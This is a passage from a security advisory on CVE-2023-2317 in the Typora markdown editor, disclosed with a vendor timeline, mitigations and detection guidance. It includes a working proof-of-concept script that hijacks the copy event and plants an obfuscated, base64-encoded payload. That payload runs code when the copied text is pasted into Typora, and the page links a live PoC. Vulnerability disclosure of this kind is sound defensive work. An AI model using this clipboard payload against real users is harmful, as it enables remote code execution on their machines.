<p>An attacker can craft a malicious webpage and hook on the <code>copy</code> event with the following code:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nb">document</span><span class="p">.</span><span class="nx">addEventListener</span><span class="p">(</span><span class="s1">&#39;copy&#39;</span><span class="p">,</span><span class="nx">e</span><span class="p">=&gt;{</span>
</span></span><span class="line"><span class="cl">        <span class="nx">e</span><span class="p">.</span><span class="nx">preventDefault</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">        <span class="kd">let</span> <span class="nx">payload</span> <span class="o">=</span> <span class="nx">atob</span><span class="p">(</span><span class="s1">&#39;JiN4M2M7ZW1iZWQgc3R5bGU9ImhlaWdodDowOyIgc3JjPSJ0eXBvcmE6Ly9hcHAvdHlwZW1hcmsvdXBkYXRlci91cGRhdGVyLmh0bWw/Y3VyVmVyc2lvbj0xMTEmbmV3VmVyc2lvbj0yMjImcmVsZWFzZU5vdGVMaW5rPTMzMyZoaWRlQXV0b1VwZGF0ZXM9ZmFsc2UmbGFiZWxzPVslMjIlMjIsJTIyJTNjc3ZnJTJmb25sb2FkPXRvcC5ldmFsKGF0b2IoJ2NtVnhibTlrWlNnblkyaHBiR1JmY0hKdlkyVnpjeWNwTG1WNFpXTW9LSHRYYVc0ek1qb2dKMjV2ZEdWd1lXUWdKVmRKVGtSSlVpVXZkMmx1TG1sdWFTY3NJRXhwYm5WNE9pQW5aMjV2YldVdFkyRnNZM1ZzWVhSdmNpQXRaU0FpVkhsd2IzSmhJRkpEUlNCUWIwTWlKMzBwVzI1aGRtbG5ZWFJ2Y2k1d2JHRjBabTl5YlM1emRXSnpkSElvTUN3MUtWMHAnKSk+PCUyZnN2Zz4lMjIsJTIyJTIyLCUyMiUyMiwlMjIlMjIsJTIyJTIyXSI+JiN4MGQ7JiN4MGQ7&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nx">e</span><span class="p">.</span><span class="nx">clipboardData</span><span class="p">.</span><span class="nx">setData</span><span class="p">(</span><span class="s1">&#39;text/markhtml&#39;</span><span class="p">,</span> <span class="sb">`\x20\x0d\x0a\x0d\x0a`</span> <span class="o">+</span> <span class="nx">payload</span> <span class="o">+</span> <span class="nb">window</span><span class="p">.</span><span class="nx">getSelection</span><span class="p">());</span>
</span></span><span class="line"><span class="cl">        <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">payload</span> <span class="o">+</span> <span class="nb">window</span><span class="p">.</span><span class="nx">getSelection</span><span class="p">())</span>
</span></span><span class="line"><span class="cl">    <span class="p">})</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
</span></span></code></pre></div><p>When the victim copies text from this page, the payload is added to the copied content and will be triggered when it is pasted into Typora.</p>
<p><img loading="lazy" src="/advisories/23/images/CVE-2023-2317_05.copy-paste-on-Windows.gif" alt=""  />
</p>
<p><img loading="lazy" src="/advisories/23/images/CVE-2023-2317_06.copy-paste-on-Ubuntu.gif" alt=""  />
</p>
<p>We have attached <code>poc/rce-cp.html</code> as PoC of this scenario. A live version can also be found <a href="https://o.cal1.cn/f0a97fdef8028595-typora-poc/rce-cp.html">here</a>.</p>
<h3 id="additional-notes">Additional Notes:<a hidden class="anchor" aria-hidden="true" href="#additional-notes">#</a></h3>
<ol>
<li>It is possible for attackers to set custom styles on the <code>&lt;embed&gt;</code> tag to make the exploit less noticeable. For instance, <code>height:0;</code> is used in the Scenario 2 PoC to hide the embedded webpage.</li>
</ol>
<h2 id="suggested-mitigations">Suggested Mitigations:<a hidden class="anchor" aria-hidden="true" href="#suggested-mitigations">#</a></h2>
<p>It is recommended to update HTML elements by setting <code>innerText</code> instead of <code>innerHTML</code>.</p>
<p>For end users who are using the versions affected by this vulnerability, it is suggested that (1) any untrusted markdown file should not be opened in Typora, and (2) copying text from an untrusted webpage then pasting it into Typora should be avoided.</p>
<h2 id="detection-guidance">Detection Guidance:<a hidden class="anchor" aria-hidden="true" href="#detection-guidance">#</a></h2>
<p>It is possible to detect the exploitation of this vulnerability by checking the presence of <code>embed</code> tags loading suspicious URLs in markdown files.</p>
<h2 id="credits">Credits:<a hidden class="anchor" aria-hidden="true" href="#credits">#</a></h2>
<p>Li Jiantao (<a href="https://twitter.com/CurseRed">@CurseRed</a>) of STAR Labs SG Pte. Ltd. (<a href="https://twitter.com/starlabs_sg">@starlabs_sg</a>)</p>
<h2 id="timeline">Timeline:<a hidden class="anchor" aria-hidden="true" href="#timeline">#</a></h2>
<ul>
<li>2023-04-27 Vendor Disclosure</li>
<li>2023-05-22 Vendor Patch Release</li>
<li>2023-08-19 Public Release</li>
</ul>


  </div>

  <footer class="post-footer">
    <ul class="post-tags">
    </ul>
<nav class="paginav">
  <a class="prev" href="https://starlabs.sg/advisories/23/23-2316/">
    <span class="title">« Prev</span>
    <br>
    <span>(CVE-2023-2316) Typora Local File Disclosure</span>
  </a>
  <a class="next" href="https://starlabs.sg/advisories/23/23-2318/">
    <span class="title">Next »</span>
    <br>
    <span>(CVE-2023-2318) MarkText DOM-Based Cross-site Scripting leading to Remote Code Execution</span>
  </a>
</nav>

  </footer>
</article>
    </main>
    
<footer class="footer">
    <span>&copy; 2024 <a href="https://starlabs.sg/">STAR Labs</a></span>
    <span>
        Powered by
        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
        <a href="https://git.io/hugopapermod" rel="noopener" target="_blank">PaperMod</a>
    </span>
</footer>
<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
        <path d="M12 6H0l6-6z" />
    </svg>
</a>

<script>
    let menu = document.getElementById('menu')
    if (menu) {
        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
        menu.onscroll = function () {
            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
        }
    }

    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
        anchor.addEventListener("click", function (e) {
            e.preventDefault();
            var id = this.getAttribute("href").substr(1);
            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
                    behavior: "smooth"
                });
            } else {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
            }
            if (id === "top") {
                history.replaceState(null, null, " ");
            } else {
                history.pushState(null, null, `#${id}`);
            }
        });
    });

</script>
<script>
    var mybutton = document.getElementById("top-link");
    window.onscroll = function () {
        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
            mybutton.style.visibility = "visible";
            mybutton.style.opacity = "1";
        } else {
            mybutton.style.visibility = "hidden";
            mybutton.style.opacity = "0";
        }
    };

</script>
</body>

</html>
